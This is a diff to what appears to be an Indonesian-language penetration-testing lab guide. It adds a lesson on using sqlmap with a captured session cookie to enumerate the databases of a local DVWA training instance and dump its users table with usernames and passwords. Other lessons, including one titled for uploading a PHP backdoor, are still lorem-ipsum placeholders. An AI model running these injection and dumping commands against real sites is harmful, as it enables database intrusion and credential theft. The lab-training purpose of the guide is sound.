@@ -176,8 +176,59 @@ cd /pentest/passwords/john
 
 ### Lesson 7: Automate SQL Injection with SqlMap
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Login ke DVWA dan buka menu SQL INjection
+2. Start add On tamper data
+3. MAsukkan angka 1 di kolom sql injection, maka akan muncul notifikasi submit. uncheck checkbox
+Gambar16
+4. Catat data REferrer dan data Cookiedari salah satu paket GET
+GAMBAR 17
+5. Buka folder SQLMAP pada terminal dengan mengetik
+```
+cd /pentest/web/scanners/sqlmap
+```
+6. Menggunakan sqlmap meandapatkan database dan user yang digunakan
+```
+/sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -b --current-db --current-user
+```
+Ket : sesuaikan data dengan langkah ke 4
 
+jika ada pemrtanyaan, pilih yes. Setelah proses selesai, hasilnya kan sepertin ini :
+
+Gambar 18
+
+Data tersebut merupakan database yang sedang digunakan
+
+8. Menggunakan sqlmap untuk dapatkan semua database yang ada
+
+Jalankan perintah :
+```
+./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
+```
+Ket : sesuaikan data dengan langkah ke 4
+
+Jika berhasil maka akan seperti gambar di bawah ini :
+
+Gambar 19
+
+9. MEnggunakan sqlmap untuk dapatkan isi username dan password database DVWA
+```
+./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa --tables
+```
+Ket : sesuaikan data dengan langkah ke 4
+
+Gambar 20
+Jalankan perintah :
+```
+./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns
+```
+Ket : sesuaikan data dengan langkah ke 4
+Gambar 21
+Jalankan perintah :
+```
+./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users -C user,password --dump
+```
+Ket : sesuaikan data dengan langkah ke 4
+Gambar 22
 ### Lesson 8: Upload PHP Backdoor Payload
 
 "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
